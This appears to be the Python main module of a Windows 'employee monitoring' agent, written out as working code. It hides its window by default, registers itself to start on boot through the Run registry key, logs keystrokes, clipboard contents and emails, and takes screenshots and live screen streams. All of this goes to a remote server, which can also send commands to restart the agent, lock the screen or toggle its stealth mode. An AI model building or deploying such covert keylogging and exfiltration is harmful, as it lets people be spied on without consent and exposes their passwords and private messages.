"""
Employee Monitor Agent - Main Entry Point
Full-featured monitoring agent with all capabilities
"""

import sys
import os
import time
import threading
import argparse
import ctypes
import socket
import psutil
from datetime import datetime

# Fix imports for PyInstaller
if getattr(sys, 'frozen', False):
    # Running as compiled exe
    BASE_DIR = os.path.dirname(sys.executable)
    # Also add _internal folder for PyInstaller onedir mode
    INTERNAL_DIR = os.path.join(BASE_DIR, '_internal')
    if os.path.exists(INTERNAL_DIR):
        sys.path.insert(0, INTERNAL_DIR)
else:
    # Running as script
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

sys.path.insert(0, BASE_DIR)

from config import (
    load_config, save_config, get_or_create_agent_id,
    HEARTBEAT_INTERVAL, ACTIVITY_SEND_INTERVAL, SERVER_URL, WS_URL,
    SERVER_HOST, SERVER_PORT, SCREENSHOT_INTERVAL,
    NETWORK_MONITOR_INTERVAL, EMAIL_CHECK_INTERVAL, INSTALL_CHECK_INTERVAL
)
from utils.system_info import get_system_info
from utils.stealth import enable_stealth_mode, disable_stealth_mode, set_window_visibility
from communication.api_client import APIClient
from communication.websocket_client import WebSocketClient

# Core monitors
from monitors.process_monitor import ProcessMonitor
from monitors.screenshot import ScreenshotCapture
from monitors.usb_monitor import USBMonitor

# Phase 1 monitors
from monitors.keylogger import Keylogger
from monitors.clipboard_monitor import ClipboardMonitor
from monitors.idle_detector import IdleDetector
from monitors.screen_recorder import ScreenRecorder

# Phase 2 monitors
from monitors.web_monitor import WebMonitor
from monitors.app_blocker import AppBlocker

# Phase 3 monitors
from monitors.file_monitor import FileMonitor
from monitors.print_monitor import PrintMonitor
from monitors.dlp_monitor import DLPMonitor

# Phase 4 monitors
from monitors.device_control import DeviceControl

# Phase 5 monitors
from monitors.login_tracker import LoginTracker
from monitors.time_tracker import TimeTracker

# Phase 6 monitors
from monitors.communication_monitor import CommunicationMonitor

# Phase 7-8 monitors
from monitors.alert_engine import AlertEngine
from monitors.productivity_scorer import ProductivityScorer

# Phase 9 - Employee dashboard
from monitors.employee_dashboard import EmployeeDashboard

# Phase 10 - New monitors
from monitors.email_monitor import EmailMonitor
from monitors.network_monitor import NetworkMonitor
from monitors.install_monitor import InstallMonitor


class EmployeeMonitorAgent:
    def __init__(self, server_host=None, server_port=None, enable_dashboard=True):
        # Configuration
        self.config = load_config()

        # Override server settings if provided
        if server_host:
            self.server_url = f"http://{server_host}:{server_port or 3847}"
            self.ws_url = f"ws://{server_host}:{server_port or 3847}/ws"
        else:
            self.server_url = SERVER_URL
            self.ws_url = WS_URL

        # Core components
        self.api_client = APIClient(self.server_url)
        self.ws_client = WebSocketClient(self.ws_url)

        # State
        self.running = False
        self.agent_id = None
        self.system_info = get_system_info()

        # Initialize all monitors
        self._init_monitors()

        # Initialize alert engine and productivity scorer
        self.alert_engine = AlertEngine(on_alert_callback=self.on_alert)
        self.productivity_scorer = ProductivityScorer()

        # Employee dashboard (optional, disabled in stealth mode)
        stealth = self.config.get('stealth_mode', False)
        self.enable_dashboard = enable_dashboard and not stealth
        self.employee_dashboard = None

        # Setup callbacks
        self._setup_callbacks()

    def _init_monitors(self):
        """Initialize all monitoring components"""
        # Core monitors
        self.process_monitor = ProcessMonitor()
        self.screenshot_capture = ScreenshotCapture()
        self.usb_monitor = USBMonitor(on_event_callback=self.on_usb_event)

        # Phase 1 monitors
        self.keylogger = Keylogger(on_keystroke_callback=self.on_keystroke)
        self.clipboard_monitor = ClipboardMonitor(on_clipboard_callback=self.on_clipboard)
        self.idle_detector = IdleDetector(on_state_change_callback=self._on_idle_state_change)
        self.screen_recorder = ScreenRecorder()

        # Phase 2 monitors
        self.web_monitor = WebMonitor()
        self.app_blocker = AppBlocker(
            on_block_callback=self.on_app_blocked,
            on_app_launch_callback=self.on_app_launch
        )

        # Phase 3 monitors
        self.file_monitor = FileMonitor(on_file_event_callback=self.on_file_event)
        self.print_monitor = PrintMonitor(on_print_callback=self.on_print_event)
        self.dlp_monitor = DLPMonitor(on_alert_callback=self.on_dlp_alert)

        # Phase 4 monitors
        self.device_control = DeviceControl(on_device_event_callback=self.on_device_event)

        # Phase 5 monitors
        self.login_tracker = LoginTracker(on_login_event_callback=self.on_login_event)
        self.time_tracker = TimeTracker(on_time_event_callback=self.on_time_event)

        # Phase 6 monitors
        self.comm_monitor = CommunicationMonitor(on_comm_event_callback=self.on_comm_event)

        # Phase 10 monitors
        self.email_monitor = EmailMonitor(
            on_email_callback=self.on_email_event,
            check_interval=EMAIL_CHECK_INTERVAL
        )
        self.network_monitor = NetworkMonitor(
            on_network_callback=self.on_network_event,
            interval=NETWORK_MONITOR_INTERVAL
        )
        self.install_monitor = InstallMonitor(
            on_install_callback=self.on_install_event,
            check_interval=INSTALL_CHECK_INTERVAL
        )

    def _setup_callbacks(self):
        """Setup WebSocket callbacks"""
        self.ws_client.on_screenshot_request = self.handle_screenshot_request
        self.ws_client.on_usb_policy_update = self.handle_usb_policy_update
        self.ws_client.on_status_request = self.handle_status_request
        self.ws_client.on_connected = self.on_ws_connected
        self.ws_client.on_disconnected = self.on_ws_disconnected
        self.ws_client.on_block_app = self.handle_block_app
        self.ws_client.on_block_website = self.handle_block_website
        self.ws_client.on_start_stream = self.handle_start_stream
        self.ws_client.on_stop_stream = self.handle_stop_stream
        self.ws_client.on_data_sync_request = self.handle_data_sync_request
        # New remote command callbacks
        self.ws_client.on_restart = self.handle_restart
        self.ws_client.on_lock_screen = self.handle_lock_screen
        self.ws_client.on_show_message = self.handle_show_message
        self.ws_client.on_system_info_request = self.handle_system_info_request
        self.ws_client.on_toggle_stealth = self.handle_toggle_stealth

    def _ensure_auto_start(self):
        """Verify agent is registered for auto-start on boot"""
        try:
            import winreg
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            server_args = f'--server {self.server_url.split("//")[1].split(":")[0]} --port {self.server_url.split(":")[-1]}'

            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            reg_name = "EmployeeMonitor"

            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
                existing_val, _ = winreg.QueryValueEx(key, reg_name)
                winreg.CloseKey(key)
                # Already registered
                return
            except (FileNotFoundError, OSError):
                pass

            # Register for auto-start
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, f'"{exe_path}" {server_args}')
                winreg.CloseKey(key)
                print("Auto-start registered (HKLM)")
            except (PermissionError, OSError):
                # Fall back to HKCU if no admin rights
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, f'"{exe_path}" {server_args}')
                    winreg.CloseKey(key)
                    print("Auto-start registered (HKCU)")
                except Exception as e:
                    print(f"Could not register auto-start: {e}")
        except Exception as e:
            print(f"Auto-start check error: {e}")

    def start(self):
        """Start the monitoring agent"""
        print("=" * 60)
        print("Employee Monitor Agent Starting (Full Version)")
        print("=" * 60)
        print(f"PC Name: {self.system_info['pc_name']}")
        print(f"User: {self.system_info['username']}")
        print(f"Server: {self.server_url}")
        print("=" * 60)

        # Ensure auto-start on boot
        self._ensure_auto_start()

        # Register with server
        if not self.register():
            print("Failed to register with server. Retrying...")
            self.retry_registration()

        self.running = True

        # Start all monitors
        print("\nStarting monitors...")
        self._start_all_monitors()

        # Connect WebSocket
        self.ws_client.connect(self.agent_id)

        # Start background tasks
        self.start_background_tasks()

        # Start employee dashboard if enabled
        if self.enable_dashboard:
            self._start_employee_dashboard()

        # Auto clock-in
        self.time_tracker.auto_start()

        print("\n" + "=" * 60)
        print("Agent is now running. Press Ctrl+C to stop.")
        print("=" * 60 + "\n")

    def _start_all_monitors(self):
        """Start all monitoring components"""
        monitors = [
            ('Process Monitor', self.process_monitor),
            ('USB Monitor', self.usb_monitor),
            ('Keylogger', self.keylogger),
            ('Clipboard Monitor', self.clipboard_monitor),
            ('Idle Detector', self.idle_detector),
            ('Web Monitor', self.web_monitor),
            ('App Blocker', self.app_blocker),
            ('File Monitor', self.file_monitor),
            ('Print Monitor', self.print_monitor),
            ('Device Control', self.device_control),
            ('Login Tracker', self.login_tracker),
            ('Communication Monitor', self.comm_monitor),
            ('Email Monitor', self.email_monitor),
            ('Network Monitor', self.network_monitor),
            ('Install Monitor', self.install_monitor),
            ('Alert Engine', self.alert_engine),
        ]

        for name, monitor in monitors:
            try:
                monitor.start()
                print(f"  [OK] {name}")
            except Exception as e:
                print(f"  [FAIL] {name}: {e}")

    def _start_employee_dashboard(self):
        """Start the employee self-monitoring dashboard"""
        try:
            self.employee_dashboard = EmployeeDashboard(port=8080)

            # Provide data sources to dashboard
            self.employee_dashboard.set_data_provider('process', self.process_monitor)
            self.employee_dashboard.set_data_provider('web', self.web_monitor)
            self.employee_dashboard.set_data_provider('file', self.file_monitor)
            self.employee_dashboard.set_data_provider('time', self.time_tracker)
            self.employee_dashboard.set_data_provider('productivity', self.productivity_scorer)
            self.employee_dashboard.set_data_provider('alerts', self.alert_engine)

            self.employee_dashboard.start()
            print(f"\n  Employee dashboard available at http://127.0.0.1:8080")
        except Exception as e:
            print(f"  Could not start employee dashboard: {e}")

    def register(self):
        """Register agent with the server"""
        print("Registering with server...")

        result = self.api_client.register(
            employee_name=self.system_info['employee_name'],
            pc_name=self.system_info['pc_name'],
            os_version=self.system_info['os_version']
        )

        if result.get('success'):
            self.agent_id = result['agent_id']
            self.api_client.agent_id = self.agent_id

            # Save agent ID to config
            self.config['agent_id'] = self.agent_id
            save_config(self.config)

            print(f"Registered successfully! Agent ID: {self.agent_id}")

            # Apply policies from server
            self._apply_server_policies(result)

            return True
        else:
            print(f"Registration failed: {result.get('error')}")
            return False

    def _apply_server_policies(self, registration_result):
        """Apply policies received from server"""
        # USB policies
        usb_policies = registration_result.get('usb_policies', [])
        if usb_policies:
            self.usb_monitor.update_policies(usb_policies)

        # Device control policies
        device_policy = registration_result.get('device_policy', {})
        if device_policy:
            self.device_control.apply_policy(device_policy)

        # Blocked apps
        blocked_apps = registration_result.get('blocked_apps', [])
        for app in blocked_apps:
            self.app_blocker.block_app(app)

        # Blocked websites
        blocked_sites = registration_result.get('blocked_websites', [])
        for site in blocked_sites:
            self.web_monitor.block_site(site)

    def retry_registration(self):
        """Retry registration with exponential backoff"""
        delay = 5
        max_delay = 60

        while not self.agent_id:
            print(f"Retrying registration in {delay} seconds...")
            time.sleep(delay)

            if self.register():
                break

            delay = min(delay * 2, max_delay)

    def start_background_tasks(self):
        """Start background tasks"""
        # Heartbeat thread
        self.heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()

        # Activity sender thread
        self.activity_thread = threading.Thread(target=self.activity_sender_loop, daemon=True)
        self.activity_thread.start()

        # Data aggregation thread
        self.aggregation_thread = threading.Thread(target=self.data_aggregation_loop, daemon=True)
        self.aggregation_thread.start()

        # Auto screenshot thread
        self.auto_screenshot_thread = threading.Thread(target=self.auto_screenshot_loop, daemon=True)
        self.auto_screenshot_thread.start()

    def heartbeat_loop(self):
        """Send periodic heartbeats"""
        while self.running:
            try:
                self.api_client.heartbeat()

                if self.ws_client.connected:
                    self.ws_client.send_heartbeat()

            except Exception as e:
                print(f"Heartbeat error: {e}")

            time.sleep(HEARTBEAT_INTERVAL)

    def activity_sender_loop(self):
        """Send activities to server periodically"""
        while self.running:
            try:
                # Process activities
                activities = self.process_monitor.get_activities(clear=False)
                if activities:
                    result = self.api_client.send_activities(activities)
                    if result.get('success'):
                        self.process_monitor.get_activities(clear=True)

                        # Update productivity scorer
                        for activity in activities:
                            self.productivity_scorer.record_app_time(
                                activity.get('app_name', ''),
                                activity.get('duration_seconds', 0)
                            )

            except Exception as e:
                print(f"Activity sender error: {e}")

            time.sleep(ACTIVITY_SEND_INTERVAL)

    def data_aggregation_loop(self):
        """Aggregate and send various monitoring data"""
        first_run = True
        while self.running:
            try:
                # Short delay on first run to let monitors collect data, then 1 min
                time.sleep(30 if first_run else 60)
                first_run = False

                if not self.running:
                    break

                # Collect data from all monitors
                data = {
                    'agent_id': self.agent_id,
                    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S'),
                    'web_history': self.web_monitor.get_visits()[-50:],
                    'file_events': self.file_monitor.get_events()[-50:] if hasattr(self.file_monitor, 'get_events') else [],
                    'print_jobs': self.print_monitor.get_job_history()[-20:] if hasattr(self.print_monitor, 'get_job_history') else [],
                    'dlp_alerts': self.dlp_monitor.get_alerts()[-20:],
                    'device_events': self.device_control.get_events()[-20:] if hasattr(self.device_control, 'get_events') else [],
                    'login_events': self.login_tracker.get_events()[-20:] if hasattr(self.login_tracker, 'get_events') else [],
                    'comm_events': self.comm_monitor.get_events()[-20:] if hasattr(self.comm_monitor, 'get_events') else [],
                    'alerts': self.alert_engine.get_alerts()[-20:],
                    'risk_score': self.alert_engine.get_risk_score(),
                    'productivity': self.productivity_scorer.calculate_score(),
                    'time_tracking': self.time_tracker.get_today_summary(),
                    'keystrokes': self.keylogger.get_logs(clear=True)[-50:],
                    'clipboard': self.clipboard_monitor.get_logs(clear=True)[-50:],
                    'emails': self.email_monitor.get_emails(clear=True)[-20:],
                    'network_usage': self.network_monitor.get_events(clear=True)[-50:],
                    'app_installs': self.install_monitor.get_events(clear=True)[-20:],
                }

                # Send to server
                self.api_client.send_monitoring_data(data)

            except Exception as e:
                print(f"Data aggregation error: {e}")

    def auto_screenshot_loop(self):
        """Take screenshots automatically at configured interval"""
        interval = self.config.get('screenshot_interval', SCREENSHOT_INTERVAL)
        print(f"Auto screenshot enabled (every {interval}s)")

        while self.running:
            time.sleep(interval)

            if not self.running:
                break

            try:
                image_bytes, filename = self.screenshot_capture.capture()
                if image_bytes:
                    result = self.api_client.upload_screenshot(image_bytes, filename)
                    if result.get('success'):
                        print(f"[AUTO-SCREENSHOT] Captured and uploaded: {filename}")
                    else:
                        print(f"[AUTO-SCREENSHOT] Upload failed: {result.get('error')}")
            except Exception as e:
                print(f"Auto screenshot error: {e}")

    # Event handlers
    def on_keystroke(self, event):
        """Handle keystroke event"""
        # Scan for sensitive data
        if event.get('buffer'):
            self.dlp_monitor.scan_text(event['buffer'], source='keystroke')

    def on_clipboard(self, event):
        """Handle clipboard event"""
        if event.get('content'):
            alerts = self.dlp_monitor.scan_text(event['content'], source='clipboard')
            if alerts:
                for alert in alerts:
                    self.alert_engine.process_event({
                        'type': 'dlp',
                        'severity': alert['severity'],
                        'source': 'clipboard',
                        **alert
                    })

    def _on_idle_state_change(self, event):
        """Handle idle state change from IdleDetector"""
        if event.get('state') == 'idle':
            duration = event.get('previous_active_duration', 0)
            self.on_idle(duration)
        elif event.get('state') == 'active':
            self.on_active()

    def on_idle(self, duration):
        """Handle idle detection"""
        self.productivity_scorer.record_idle_time(duration)
        self.alert_engine.process_event({
            'type': 'idle',
            'duration_seconds': duration
        })

    def on_active(self):
        """Handle return from idle"""
        pass

    def on_usb_event(self, event):
        """Handle USB event"""
        self.api_client.log_usb_event(event)
        if self.ws_client.connected:
            self.ws_client.send_usb_event(event)

        self.alert_engine.process_event({
            'type': 'device',
            'device_type': 'usb',
            **event
        })

    def on_device_event(self, event):
        """Handle device control event"""
        allowed = event.get('allowed', True)
        self.alert_engine.process_event({
            'type': 'device',
            'blocked': not allowed,
            **event
        })

    def on_app_blocked(self, event):
        """Handle blocked app"""
        self.alert_engine.process_event({
            'type': 'app_blocked',
            **event
        })

    def on_app_launch(self, event):
        """Handle app launch"""
        self.alert_engine.record_activity('app_launch')

    def on_file_event(self, event):
        """Handle file event"""
        if event.get('is_sensitive'):
            self.alert_engine.process_event({
                'type': 'file',
                'is_sensitive': True,
                **event
            })

        # Check file content for DLP
        if event.get('action') in ['created', 'modified']:
            filepath = event.get('filepath')
            if filepath and event.get('category') in ['documents', 'data']:
                self.dlp_monitor.scan_file(filepath)

        self.alert_engine.record_activity('file_access')

    def on_print_event(self, event):
        """Handle print event"""
        pages = event.get('pages', 0)
        self.alert_engine.process_event({
            'type': 'print',
            'pages': pages,
            **event
        })

    def on_dlp_alert(self, alert):
        """Handle DLP alert"""
        self.alert_engine.process_event({
            'type': 'dlp',
            **alert
        })

    def on_login_event(self, event):
        """Handle login/logout event"""
        self.alert_engine.process_event({
            'type': 'login',
            **event
        })

    def on_time_event(self, event):
        """Handle time tracking event"""
        pass

    def on_comm_event(self, event):
        """Handle communication app event"""
        pass

    def on_email_event(self, event):
        """Handle email capture event"""
        self.alert_engine.record_activity('email')

    def on_network_event(self, event):
        """Handle network usage event"""
        pass

    def on_install_event(self, event):
        """Handle app install/uninstall event"""
        self.alert_engine.process_event({
            'type': 'app_install',
            'action': event.get('action'),
            'app_name': event.get('app_name'),
            **event
        })

    def on_alert(self, alert):
        """Handle alert from alert engine"""
        # Send critical alerts immediately
        if alert['severity'] in ['critical', 'high']:
            if self.ws_client.connected:
                self.ws_client.send({
                    'type': 'alert',
                    'alert': alert
                })

    # WebSocket handlers
    def handle_screenshot_request(self):
        """Handle screenshot request"""
        print("Taking screenshot...")
        try:
            image_bytes, filename = self.screenshot_capture.capture()
            if image_bytes:
                result = self.api_client.upload_screenshot(image_bytes, filename)
                if result.get('success'):
                    self.ws_client.send_screenshot_ready(result.get('id'))
        except Exception as e:
            print(f"Screenshot error: {e}")

    def handle_usb_policy_update(self, policy):
        """Handle USB policy update"""
        if policy:
            current_policies = self.api_client.get_usb_policies()
            self.usb_monitor.update_policies(current_policies)

    def handle_status_request(self):
        """Handle status request"""
        current = self.process_monitor.get_current_activity()
        status = {
            'agent_id': self.agent_id,
            'pc_name': self.system_info['pc_name'],
            'current_app': current.get('app_name'),
            'current_title': current.get('window_title'),
            'usb_devices': len(self.usb_monitor.connected_devices),
            'risk_score': self.alert_engine.get_risk_score(),
            'productivity_score': self.productivity_scorer.calculate_score().get('score', 0),
        }
        self.ws_client.send_status(status)

    def handle_block_app(self, app_name):
        """Handle remote app block command"""
        try:
            self.app_blocker.block_app(app_name)
            print(f"App blocked: {app_name}")
        except Exception as e:
            print(f"Error blocking app: {e}")

    def handle_block_website(self, domain):
        """Handle remote website block command"""
        try:
            self.web_monitor.block_site(domain)
            print(f"Website blocked: {domain}")
        except Exception as e:
            print(f"Error blocking website: {e}")

    def handle_start_stream(self, data):
        """Handle remote screen stream start command"""
        try:
            fps = data.get('fps', 1)
            quality = data.get('quality', 30)

            def stream_callback(frame):
                self.ws_client.send({
                    'type': 'screen_frame',
                    'agent_id': self.agent_id,
                    'image': frame.get('image'),
                    'timestamp': frame.get('timestamp')
                })

            self.screen_recorder.start_streaming(stream_callback, fps=fps, quality=quality)
            print(f"Screen streaming started (fps={fps}, quality={quality})")
        except Exception as e:
            print(f"Error starting stream: {e}")

    def handle_stop_stream(self):
        """Handle remote screen stream stop command"""
        try:
            self.screen_recorder.stop_streaming()
            print("Screen streaming stopped")
        except Exception as e:
            print(f"Error stopping stream: {e}")

    def handle_data_sync_request(self, data_type):
        """Handle data sync request - immediately collect and send buffered data"""
        try:
            print(f"Data sync request received for: {data_type}")
            data = {
                'agent_id': self.agent_id,
                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S'),
            }

            if data_type == 'keystrokes':
                data['keystrokes'] = self.keylogger.get_logs(clear=True)[-50:]
            elif data_type == 'clipboard':
                data['clipboard'] = self.clipboard_monitor.get_logs(clear=True)[-50:]
            elif data_type == 'web_history':
                data['web_history'] = self.web_monitor.get_visits()[-50:]
            elif data_type == 'file_events':
                data['file_events'] = self.file_monitor.get_events()[-50:] if hasattr(self.file_monitor, 'get_events') else []
            elif data_type == 'dlp_alerts':
                data['dlp_alerts'] = self.dlp_monitor.get_alerts()[-20:]
            elif data_type == 'print_jobs':
                data['print_jobs'] = self.print_monitor.get_job_history()[-20:] if hasattr(self.print_monitor, 'get_job_history') else []
            elif data_type == 'login_events':
                data['login_events'] = self.login_tracker.get_events()[-20:] if hasattr(self.login_tracker, 'get_events') else []
            elif data_type == 'comm_events':
                data['comm_events'] = self.comm_monitor.get_events()[-20:] if hasattr(self.comm_monitor, 'get_events') else []
            elif data_type == 'activities':
                data['activities'] = self.process_monitor.get_activities(clear=False)
            elif data_type == 'productivity':
                data['productivity'] = self.productivity_scorer.calculate_score()
            elif data_type == 'time_tracking':
                data['time_tracking'] = self.time_tracker.get_today_summary()
            elif data_type == 'emails':
                data['emails'] = self.email_monitor.get_emails(clear=True)[-20:]
            elif data_type == 'network_usage':
                data['network_usage'] = self.network_monitor.get_events(clear=True)[-50:]
            elif data_type == 'app_installs':
                data['app_installs'] = self.install_monitor.get_events(clear=True)[-20:]

            self.api_client.send_monitoring_data(data)
            self.ws_client.send_data_sync_complete(data_type)
            print(f"Data sync complete for: {data_type}")
        except Exception as e:
            print(f"Data sync error: {e}")

    def on_ws_connected(self):
        """WebSocket connected"""
        print("Real-time connection established")

    def on_ws_disconnected(self):
        """WebSocket disconnected"""
        print("Real-time connection lost, will reconnect...")

    # New remote command handlers
    def handle_restart(self):
        """Restart agent process"""
        print("Restart command received, restarting agent...")
        try:
            # Send acknowledgment before restart
            self.ws_client.send({
                'type': 'command_response',
                'command': 'restart_agent',
                'status': 'restarting'
            })
            time.sleep(1)
            # Restart the process
            os.execv(sys.executable, ['python'] + sys.argv)
        except Exception as e:
            print(f"Restart error: {e}")

    def handle_lock_screen(self):
        """Lock Windows workstation"""
        print("Lock screen command received")
        try:
            ctypes.windll.user32.LockWorkStation()
            self.ws_client.send({
                'type': 'command_response',
                'command': 'lock_screen',
                'status': 'success'
            })
        except Exception as e:
            print(f"Lock screen error: {e}")
            self.ws_client.send({
                'type': 'command_response',
                'command': 'lock_screen',
                'status': 'error',
                'error': str(e)
            })

    def handle_show_message(self, data):
        """Show message box to user"""
        print(f"Show message command received: {data}")
        try:
            title = data.get('title', 'Message from IT')
            message = data.get('message', '')
            msg_type = data.get('msg_type', 'info')  # info, warning, error

            # Run in separate thread to not block
            def show_msg():
                try:
                    # MB_OK = 0, MB_ICONINFORMATION = 0x40, MB_ICONWARNING = 0x30, MB_ICONERROR = 0x10
                    icon_map = {
                        'info': 0x40,
                        'warning': 0x30,
                        'error': 0x10
                    }
                    icon = icon_map.get(msg_type, 0x40)
                    ctypes.windll.user32.MessageBoxW(0, message, title, 0 | icon)
                except Exception as e:
                    print(f"MessageBox error: {e}")

            threading.Thread(target=show_msg, daemon=True).start()

            self.ws_client.send({
                'type': 'command_response',
                'command': 'show_message',
                'status': 'displayed'
            })
        except Exception as e:
            print(f"Show message error: {e}")

    def handle_system_info_request(self):
        """Return detailed system information"""
        print("System info request received")
        try:
            info = {
                'agent_id': self.agent_id,
                'hostname': socket.gethostname(),
                'username': os.getlogin(),
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory_percent': psutil.virtual_memory().percent,
                'memory_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
                'memory_available_gb': round(psutil.virtual_memory().available / (1024**3), 2),
                'disk_usage_percent': psutil.disk_usage('/').percent if os.name != 'nt' else psutil.disk_usage('C:\\').percent,
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
                'process_count': len(psutil.pids()),
                'network_connections': len(psutil.net_connections()),
                'ip_addresses': [addr.address for iface in psutil.net_if_addrs().values()
                               for addr in iface if addr.family == socket.AF_INET and not addr.address.startswith('127.')],
                'platform': sys.platform,
                'python_version': sys.version,
            }

            self.ws_client.send({
                'type': 'system_info_response',
                'agent_id': self.agent_id,
                'data': info
            })
        except Exception as e:
            print(f"System info error: {e}")
            self.ws_client.send({
                'type': 'system_info_response',
                'agent_id': self.agent_id,
                'error': str(e)
            })

    def handle_toggle_stealth(self, data):
        """Toggle stealth mode (show/hide window)"""
        visible = data.get('visible', False)
        print(f"Toggle stealth command received: visible={visible}")
        try:
            set_window_visibility(visible)
            self.config['stealth_mode'] = not visible
            save_config(self.config)
            self.ws_client.send({
                'type': 'command_response',
                'command': 'toggle_stealth',
                'status': 'success',
                'visible': visible
            })
        except Exception as e:
            print(f"Toggle stealth error: {e}")

    def stop(self):
        """Stop the agent"""
        print("\nStopping agent...")
        self.running = False

        # Clock out
        if self.time_tracker.clocked_in:
            self.time_tracker.clock_out(note="Agent shutdown")

        # Stop all monitors
        monitors = [
            self.process_monitor,
            self.usb_monitor,
            self.keylogger,
            self.clipboard_monitor,
            self.idle_detector,
            self.web_monitor,
            self.app_blocker,
            self.file_monitor,
            self.print_monitor,
            self.device_control,
            self.login_tracker,
            self.comm_monitor,
            self.email_monitor,
            self.network_monitor,
            self.install_monitor,
            self.alert_engine,
        ]

        for monitor in monitors:
            try:
                monitor.stop()
            except:
                pass

        # Stop dashboard
        if self.employee_dashboard:
            self.employee_dashboard.stop()

        # Disconnect
        self.ws_client.disconnect()
        self.screenshot_capture.cleanup()

        print("Agent stopped")

    def run(self):
        """Run the agent (blocking)"""
        self.start()

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()


def main():
    parser = argparse.ArgumentParser(description='Employee Monitor Agent')
    parser.add_argument('--server', '-s', help='Server hostname or IP', default=SERVER_HOST)
    parser.add_argument('--port', '-p', type=int, help='Server port', default=SERVER_PORT)
    parser.add_argument('--name', '-n', help='Employee name override')
    parser.add_argument('--no-dashboard', action='store_true', help='Disable employee dashboard')
    parser.add_argument('--visible', '-v', action='store_true', help='Keep console window visible (disable stealth mode)')

    args = parser.parse_args()

    # Enable stealth mode unless --visible flag is set
    if not args.visible:
        config = load_config()
        if config.get('stealth_mode', True):
            enable_stealth_mode()

    agent = EmployeeMonitorAgent(
        server_host=args.server,
        server_port=args.port,
        enable_dashboard=not args.no_dashboard
    )

    if args.name:
        agent.system_info['employee_name'] = args.name

    agent.run()


if __name__ == "__main__":
    main()
